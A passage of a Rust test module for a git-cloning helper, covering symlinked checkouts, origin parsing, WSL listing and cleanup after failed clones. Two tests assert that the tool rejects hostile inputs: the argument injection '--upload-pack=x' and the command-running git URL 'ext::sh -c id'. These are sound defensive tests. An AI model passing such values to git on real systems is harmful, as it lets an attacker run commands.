    fn dir_link(target: &Path, link: &Path) -> bool {
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink(target, link).is_ok()
        }
        #[cfg(windows)]
        {
            if std::os::windows::fs::symlink_dir(target, link).is_ok() {
                return true;
            }
            // Without Developer Mode, a junction still needs no privilege.
            std::process::Command::new("cmd")
                .args(["/c", "mklink", "/J"])
                .arg(link)
                .arg(target)
                .output()
                .is_ok_and(|o| o.status.success())
                && std::fs::symlink_metadata(link).is_ok()
        }
    }

    #[test]
    fn linked_checkouts_are_never_reopened() {
        let base = tmp("dest-links");
        let url = "https://github.com/o/r";
        let same = |_: &Path| Some(url.to_string());
        // A real checkout elsewhere that the links point at.
        let elsewhere = base.join("elsewhere");
        std::fs::create_dir_all(elsewhere.join(".git")).unwrap();
        let clones = base.join("clones");
        std::fs::create_dir_all(&clones).unwrap();
        // The destination itself is a link to a checkout.
        if !dir_link(&elsewhere, &clones.join("r")) {
            eprintln!("can't create directory links here; skipping");
            std::fs::remove_dir_all(&base).ok();
            return;
        }
        assert_eq!(
            choose_dest(&clones, "r", url, same).unwrap(),
            Dest::Fresh(clones.join("r-2"))
        );
        // A real folder whose `.git` is a link.
        std::fs::create_dir_all(clones.join("r-2")).unwrap();
        assert!(dir_link(&elsewhere.join(".git"), &clones.join("r-2/.git")));
        assert_eq!(
            choose_dest(&clones, "r", url, same).unwrap(),
            Dest::Fresh(clones.join("r-3"))
        );
        // A real folder with a real `.git` is still reopened.
        std::fs::create_dir_all(clones.join("r-3/.git")).unwrap();
        assert_eq!(
            choose_dest(&clones, "r", url, same).unwrap(),
            Dest::Existing(clones.join("r-3"))
        );
        // Junctions on Windows must go before remove_dir_all walks the tree.
        for l in ["r", "r-2/.git"] {
            let p = clones.join(l);
            let _ = std::fs::remove_dir(&p).or_else(|_| std::fs::remove_file(&p));
        }
        std::fs::remove_dir_all(&base).ok();
    }

    #[test]
    fn plan_reads_a_real_origin() {
        let base = tmp("plan");
        let repo = base.join("r");
        std::fs::create_dir_all(&repo).unwrap();
        let git = |args: &[&str]| {
            std::process::Command::new("git")
                .args(args)
                .current_dir(&repo)
                .output()
                .map(|o| o.status.success())
                .unwrap_or(false)
        };
        if !git(&["init", "-q"]) {
            eprintln!("git not available; skipping");
            return;
        }
        assert!(git(&[
            "remote",
            "add",
            "origin",
            "https://github.com/o/r.git"
        ]));
        let p = plan_in(&base, "github.com/o/r/tree/main").unwrap();
        assert_eq!(p.url, "https://github.com/o/r");
        assert_eq!(p.name, "r");
        assert!(p.existing);
        assert_eq!(PathBuf::from(&p.dest), repo);
        let q = plan_in(&base, "https://github.com/o2/r").unwrap();
        assert!(!q.existing);
        assert_eq!(PathBuf::from(&q.dest), base.join("r-2"));
        assert!(plan_in(&base, "--upload-pack=x").is_err());
        std::fs::remove_dir_all(&base).ok();
    }

    /// Manual: `cargo test --locked live_wsl -- --ignored --nocapture` on a
    /// Windows machine with WSL. Reads only; never part of the normal run.
    #[test]
    #[ignore]
    fn live_wsl_listing() {
        let list = wsl_distros();
        eprintln!("distros: {list:?}");
        for d in &list {
            eprintln!(
                "{d}: start at {}",
                start_dir_in(Path::new(&wsl_root(d))).display()
            );
        }
    }

    /// A clone that fails removes the folder it made and leaves everything
    /// else alone. Loopback port 1 refuses at once, so no network is involved.
    #[tokio::test]
    async fn failed_clone_cleans_up_only_its_own_folder() {
        let base = tmp("fail");
        std::fs::create_dir_all(base.join("r")).unwrap();
        std::fs::write(base.join("r/keep.txt"), "mine").unwrap();
        let err = clone_into_base(&base, "http://127.0.0.1:1/o/r.git")
            .await
            .unwrap_err();
        assert!(!err.is_empty());
        assert!(!err.contains("Cloning into"), "{err}");
        assert!(
            base.join("r/keep.txt").exists(),
            "a folder we didn't create was touched"
        );
        assert!(
            !base.join("r-2").exists(),
            "the failed clone's folder was left behind"
        );
        assert!(clone_into_base(&base, "ext::sh -c id").await.is_err());
        assert!(!base.join("sh").exists());
        std::fs::remove_dir_all(&base).ok();
    }
}
